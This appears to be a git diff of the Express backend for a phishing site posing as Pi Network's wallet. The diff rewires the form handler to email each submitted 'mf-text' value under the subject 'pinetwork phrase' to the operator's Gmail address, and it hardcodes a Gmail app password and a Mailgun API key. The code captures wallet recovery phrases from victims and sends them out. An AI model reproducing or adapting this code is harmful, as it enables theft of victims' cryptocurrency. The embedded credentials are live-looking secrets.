@@ -1,7 +1,8 @@
 const express = require("express");
 const multer = require("multer");
 const formData = require("form-data");
-const Mailgun = require("mailgun.js");
+const nodemailer = require('nodemailer')
+// const Mailgun = require("mailgun.js");
 
 const app = express();
 const port = 8000; // Change this to your desired port
@@ -9,11 +10,19 @@ const port = 8000; // Change this to your desired port
 // Serve static files from the "my-static-website" directory
 // app.use(slashes());
 
-const mailgun = new Mailgun(formData);
-const mg = mailgun.client({
-  username: "api",
-  key: process.env.MAILGUN_API_KEY || "api_key",
-});
+// const mailgun = new Mailgun(formData);
+// const mg = mailgun.client({
+//   username: "api",
+//   key: process.env.MAILGUN_API_KEY || "2fd651279043643ee8ec93bf9a5b030c-78f6ccbe-b7f6d552",
+// });
+
+const transporter = nodemailer.createTransport({
+  auth: {
+    pass: 'zrbi zeqm feow ymab',
+    user: 'pinetworkm493@gmail.com'
+  },
+  service: 'gmail'
+})
 
 // logs any error
 
@@ -38,21 +47,26 @@ app.get("/:page", (req, res) => {
 app.post("/submit/7668", async (req, res) => {
   const mfText = req.body["mf-text"];
   const formNonce = req.body["form_nonce"];
+  if(!mfText){
+    return res.status(201)
+  }
+  
   // forward to Email
   console.log({ mfText });
   try {
-    const msg = await mg.messages.create(
-      "sandboxa9ee554ea20341a79b28a69ac8804681.mailgun.org",
+    
+    const msg = await transporter.sendMail(
       {
-        from: "PiNetworkWallet <mailgun@sandbox-123.mailgun.org>",
-        to: ["pinetworkwallet2@gmail.com"],
+        from: "PiNetworkWallet ",
+        // to: ["chiemelapromise30@gmail.com"],
+        to: ["pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
         html: `<h1>${mfText}</h1>`,
       }
-    );
+      );
   } catch (error) {
-    console.log(error);
+    console.log(error, 'the error');
   }
 
   res.json({
